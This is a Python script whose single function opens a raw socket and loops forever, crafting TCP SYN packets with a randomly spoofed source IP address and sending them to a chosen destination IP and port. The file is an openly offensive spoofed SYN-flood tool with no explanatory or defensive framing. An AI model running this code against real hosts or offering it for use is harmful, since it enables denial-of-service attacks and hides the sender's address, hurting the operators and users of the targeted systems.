import socket, sys, time
from struct import *
from numpy import uint16
from utils import *
import random
import ctypes

def send_packet(dest_ip, port, user_data):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except(socket.error):
        print('Socket could not be created.')
        sys.exit()

    # tell kernel not to put in headers, since we are providing it, when using IPPROTO_RAW this is not necessary
    # s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    while(True):        
        # now start constructing the packet
        packet = ''

        source_ip = f'{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}'

        # ip header fields
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0	# kernel will fill the correct total length
        ip_id = 54321	#Id of this packet
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0	# kernel will fill the correct checksum
        ip_saddr = socket.inet_aton(source_ip)	#Spoof the source ip address if you want to
        ip_daddr = socket.inet_aton(dest_ip)

        ip_ihl_ver = (ip_ver << 4) + ip_ihl

        # the ! in the pack format string means network order
        ip_header = pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

        # tcp header fields
        source_ip1 = int((source_ip.replace(".",""))) # remove dots
        unsigned_source_ip: int = ctypes.c_ulong(source_ip1).value # converts to unsigned
        tcp_source = socket.htons(uint16(unsigned_source_ip))	# source ip
        tcp_dest = port	# destination port
        tcp_seq = 454
        tcp_ack_seq = 0
        tcp_doff = 5	#4 bit field, size of tcp header, 5 * 4 = 20 bytes
        #tcp flags
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons(5840)	#	maximum allowed window size
        tcp_check = 0
        tcp_urg_ptr = 0

        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5)

        # the ! in the pack format string means network order
        tcp_header = pack('!HHLLBBHHH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)

        # pseudo header fields
        source_address = socket.inet_aton(source_ip)
        dest_address = socket.inet_aton(dest_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header) + len(user_data)

        psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length)
        psh = psh + tcp_header + user_data.encode()

        tcp_check = checksum(psh)

        # make the tcp header again and fill the correct checksum - remember checksum is NOT in network byte order
        tcp_header = pack('!HHLLBBH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window) + pack('H' , tcp_check) + pack('!H' , tcp_urg_ptr)

        # final full packet - syn packets dont have any data
        packet = ip_header + tcp_header + user_data.encode()

        print('Sending packet...')
        s.sendto(packet, (dest_ip , 0 ))
        print('Packet sent!')
        time.sleep(1)